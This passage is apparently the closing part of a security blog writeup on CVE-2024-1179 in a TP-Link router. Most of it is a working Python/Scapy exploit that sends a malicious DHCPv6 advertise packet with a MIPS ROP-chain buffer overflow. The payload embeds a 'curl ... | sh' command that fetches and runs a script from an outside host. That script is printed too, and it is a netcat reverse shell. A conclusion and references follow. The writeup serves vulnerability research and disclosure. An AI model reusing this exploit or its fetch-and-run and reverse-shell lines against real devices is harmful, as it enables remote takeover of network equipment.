</span></span><span style=display:flex><span>    gadget1 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x0040c4ac</span><span style=color:#f92672>+</span><span style=color:#ae81ff>1</span>  <span style=color:#75715e>## strcpy</span>
</span></span><span style=display:flex><span>    gadget2 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x40c396</span><span style=color:#f92672>+</span><span style=color:#ae81ff>1</span>    <span style=color:#75715e># memcpy</span>
</span></span><span style=display:flex><span>    gadget3 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x40a8b6</span><span style=color:#f92672>+</span><span style=color:#ae81ff>1</span>    <span style=color:#75715e># execve</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    payload <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;a&#39;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>417</span> <span style=color:#f92672>+</span> p32(w_region<span style=color:#f92672>+</span><span style=color:#ae81ff>0x80</span>) <span style=color:#f92672>+</span> p32(gadget1) <span style=color:#75715e># here s0 at offset 417 need to be valid address</span>
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    p1 <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;a&#39;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>24</span>
</span></span><span style=display:flex><span>    p1<span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;curl http://10.212.81.52:8888/x|sh;#&#39;</span> <span style=color:#75715e>## our command (source content)</span>
</span></span><span style=display:flex><span>    p1<span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;a&#39;</span><span style=color:#f92672>*</span>(<span style=color:#ae81ff>120</span><span style=color:#f92672>-</span>len(p1))
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;&#39;&#39;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        -&gt; 0x40c4bb e870                &lt;NO_SYMBOL&gt;   jrc    ra 
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        0x40c4bd 5e41                &lt;NO_SYMBOL&gt;   sltiu  a2, 112 	Maybe delay-slot
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &#39;&#39;&#39;</span>
</span></span><span style=display:flex><span>    p1<span style=color:#f92672>+=</span> p32(w_region<span style=color:#f92672>+</span><span style=color:#ae81ff>0x70</span>) <span style=color:#75715e>## Fix delay-slot (a2 need to be a valid pointer to avoid Bus error)</span>
</span></span><span style=display:flex><span>    p1<span style=color:#f92672>+=</span> p32(gadget2)  <span style=color:#75715e># ## next pc/ra --&gt; next gadget</span>
</span></span><span style=display:flex><span>    p1<span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;a&#39;</span><span style=color:#f92672>*</span>(<span style=color:#ae81ff>132</span><span style=color:#f92672>-</span>len(p1))
</span></span><span style=display:flex><span>    p1<span style=color:#f92672>+=</span> p32(w_region)  <span style=color:#75715e># destination pointer</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    p2<span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;b&#39;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>16</span>            <span style=color:#75715e>## If we choose b for exemple we will face the 0x2e (.) aftr_name, to avoid jsut extend the length</span>
</span></span><span style=display:flex><span>    p2<span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;-c</span><span style=color:#ae81ff>\x00\x00</span><span style=color:#e6db74>&#39;</span> <span style=color:#75715e>## -c strings</span>
</span></span><span style=display:flex><span>    p2<span style=color:#f92672>+=</span><span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;z&#39;</span> <span style=color:#f92672>*</span> (<span style=color:#ae81ff>84</span><span style=color:#f92672>-</span>len(p2)<span style=color:#f92672>-</span><span style=color:#ae81ff>0x4</span><span style=color:#f92672>-</span><span style=color:#ae81ff>0x4</span>)   
</span></span><span style=display:flex><span>    p2<span style=color:#f92672>+=</span> p32(gadget3)    <span style=color:#75715e>### 3 - next pc/ra --&gt; next gadget</span>
</span></span><span style=display:flex><span>    p2<span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;babe&#39;</span>
</span></span><span style=display:flex><span>    p2<span style=color:#f92672>+=</span> p32(w_region<span style=color:#f92672>+</span><span style=color:#ae81ff>0x50</span>) <span style=color:#75715e># destination pointer </span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    p3<span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;c&#39;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>36</span>
</span></span><span style=display:flex><span>    p3<span style=color:#f92672>+=</span> p32(binsh_addr) <span style=color:#f92672>+</span> p32(w_region<span style=color:#f92672>+</span><span style=color:#ae81ff>0x50</span>) <span style=color:#f92672>+</span> p32(w_region) <span style=color:#75715e># a1 = [&#39;/bin/sh&#39;, &#39;-c&#39;, command, a2=NULL]</span>
</span></span><span style=display:flex><span>    p3<span style=color:#f92672>+=</span> p32(<span style=color:#ae81ff>0x0</span>)  <span style=color:#75715e># a2 = NULL = envp</span>
</span></span><span style=display:flex><span>    p3<span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;c&#39;</span><span style=color:#f92672>*</span>(<span style=color:#ae81ff>128</span><span style=color:#f92672>-</span>len(p3))
</span></span><span style=display:flex><span>    p3<span style=color:#f92672>+=</span> p32(binsh_addr)    <span style=color:#75715e>#a0 = &#39;/bin/sh&#39;</span>
</span></span><span style=display:flex><span>    p3<span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;c&#39;</span> <span style=color:#f92672>*</span> (<span style=color:#ae81ff>358</span><span style=color:#f92672>-</span>len(p3)<span style=color:#f92672>-</span>len(p2) <span style=color:#f92672>-</span>len(p1))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    payload <span style=color:#f92672>=</span> payload <span style=color:#f92672>+</span> p1 <span style=color:#f92672>+</span> p2 <span style=color:#f92672>+</span> p3
</span></span><span style=display:flex><span>    aftr_name_option <span style=color:#f92672>=</span> code <span style=color:#f92672>+</span> (len(payload))<span style=color:#f92672>.</span>to_bytes(<span style=color:#ae81ff>2</span>, byteorder<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;big&#39;</span>) <span style=color:#f92672>+</span> payload
</span></span><span style=display:flex><span>    <span style=color:#75715e>#af = code + b&#39;\x30&#39;*1000</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># 14=0xe = RAPID_COMMIT, normally len should be 0, but we want to trigger an error so voila</span>
</span></span><span style=display:flex><span>    code <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x00\x0e</span><span style=color:#e6db74>&#39;</span>
</span></span><span style=display:flex><span>    payload <span style=color:#f92672>=</span> (<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x01</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>    rapid_commit_option <span style=color:#f92672>=</span> code <span style=color:#f92672>+</span> (len(payload))<span style=color:#f92672>.</span>to_bytes(<span style=color:#ae81ff>2</span>, byteorder<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;big&#39;</span>) <span style=color:#f92672>+</span> payload
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># Combine all layers and send packet</span>
</span></span><span style=display:flex><span>    pck <span style=color:#f92672>=</span> ethernet_layer <span style=color:#f92672>/</span> ipv6_layer <span style=color:#f92672>/</span> udp_layer <span style=color:#f92672>/</span> dhcp6_advertise <span style=color:#f92672>/</span> server_id <span style=color:#f92672>/</span> client_id <span style=color:#f92672>/</span> aftr_name_option <span style=color:#f92672>/</span> rapid_commit_option
</span></span><span style=display:flex><span>    print(pck)
</span></span><span style=display:flex><span>    sendp(pck, iface<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;br0&#34;</span>, verbose<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>interface <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;br0&#39;</span>
</span></span><span style=display:flex><span>response <span style=color:#f92672>=</span> sniff(iface<span style=color:#f92672>=</span>interface, filter<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;udp and port 546&#34;</span>, prn<span style=color:#f92672>=</span>send_dhcp6_advertise, lfilter<span style=color:#f92672>=</span>filter_solicit_msg)
</span></span></code></pre></div><p>The <code>x</code> file contents:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span><span style=color:#75715e>#!/bin/bash
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>mkfifo /tmp/f;nc 10.212.81.52 <span style=color:#ae81ff>4444</span> 0&lt;/tmp/f|/bin/sh -i 3&gt;&amp;1|tee /tmp/f
</span></span></code></pre></div><h2 id=conclusion>Conclusion<a href=#conclusion class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h2><p>This analysis demonstrates a reliable exploitation path for <strong><a href=https://nvd.nist.gov/vuln/detail/CVE-2024-1179>CVE-2024-1179</a></strong>. While the attack requires some knowledge of MIPS architecture and bypass of standard OS protections, this vulnerability is fairly easy to weaponize. We successfully achieve a remote code execution from the WAN side of the router. This vulnerability highlights the importance of rigorous bounds checking on all user-controlled input, enabling compiler security features , following secure coding guidelines for buffer management etc. It also emphasizes how critical proper security practices are, especially in network infrastructure devices where vulnerabilities can have significant consequences.</p><h2 id=references>References<a href=#references class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h2><p><a href=https://nvd.nist.gov/vuln/detail/CVE-2024-1179>https://nvd.nist.gov/vuln/detail/CVE-2024-1179</a></p><p><a href=https://www.z1r0.top/2024/03/22/Pwn2Own-CVE-2024-1179-TP-Link-Omada-ER605/>https://www.z1r0.top/2024/03/22/Pwn2Own-CVE-2024-1179-TP-Link-Omada-ER605/</a></p><p><a href=https://blog.compass-security.com/2024/08/a-patchdiffing-journey-tp-link-omada/>https://blog.compass-security.com/2024/08/a-patchdiffing-journey-tp-link-omada/</a></p><p><a href=https://diffing.quarkslab.com/tutorials/04c_firmware_diffing.html>https://diffing.quarkslab.com/tutorials/04c_firmware_diffing.html</a></p><p><a href=https://ihack4falafel.github.io/Patch-Diffing-with-Ghidra/>https://ihack4falafel.github.io/Patch-Diffing-with-Ghidra/</a></p><p><a href=https://cve-north-stars.github.io/docs/Root-Cause-Analysis>https://cve-north-stars.github.io/docs/Root-Cause-Analysis</a></p><p><a href=https://github.com/clearbluejar/ghidriff>https://github.com/clearbluejar/ghidriff</a></p><p><a href=https://stackoverflow.com/questions/66544765/how-and-when-openwrts-procd-runs-init-scripts-in-etc-init-d>https://stackoverflow.com/questions/66544765/how-and-when-openwrts-procd-runs-init-scripts-in-etc-init-d</a></p><p><a href=https://forum.turris.cz/t/etc-init-d-rcs-is-missing-what-gives/4745>https://forum.turris.cz/t/etc-init-d-rcs-is-missing-what-gives/4745</a></p><p><a href=https://blahcat.github.io/2017-07-14-building-a-debian-stretch-qemu-image-for-mipsel/>https://blahcat.github.io/2017-07-14-building-a-debian-stretch-qemu-image-for-mipsel/</a></p><p><a href=http://archive.debian.org/debian/dists/jessie/main/installer-mipsel/current/images/malta/netboot/>http://archive.debian.org/debian/dists/jessie/main/installer-mipsel/current/images/malta/netboot/</a>
<a href=http://archive.debian.org/debian>http://archive.debian.org/debian</a></p></div></article><div class="post-nav thin"><a class=next-post href=https://dilagluc.github.io/en/posts/tplink_cve_2024_5243/><span class=post-nav-label><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-left"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>&nbsp;Newer</span><br><span>TP Link CVE-2024-5243 analysis</span>
</a><a class=prev-post href=https://dilagluc.github.io/en/posts/2023/crypto/aes/square-attack-aes/><span class=post-nav-label>Older&nbsp;<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-right"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg></span><br><span>Cryptanalyse intégrale sur AES à tours réduits: l'attaque dite carrée</span></a></div><div id=comments class=thin></div></main><footer id=site-footer class="section-inner thin animated fadeIn faster"><p>&copy; 2025 <a href=https://dilagluc.github.io/>Blog</a>
&#183; <a href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank rel=noopener>dilag</a>&#183; Made with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a>
&#183; Theme <a href=https://github.com/1bl4z3r/hermit-V2 target=_blank rel=noopener>Hermit-V2</a></p></footer><script async src=https://dilagluc.github.io/js/bundle.min.c7c384e4d29d192bbac6811ae4660bb01767194a5bea56baca77e8260f93ea16.js integrity="sha256-x8OE5NKdGSu6xoEa5GYLsBdnGUpb6la6ynfoJg+T6hY=" crossorigin=anonymous></script><script async src=https://dilagluc.github.io/js/link-share.min.24409a4f6e5537d70ffc55ec8f9192208d718678cb8638585342423020b37f39.js integrity="sha256-JECaT25VN9cP/FXsj5GSII1xhnjLhjhYU0JCMCCzfzk=" crossorigin=anonymous></script></body></html>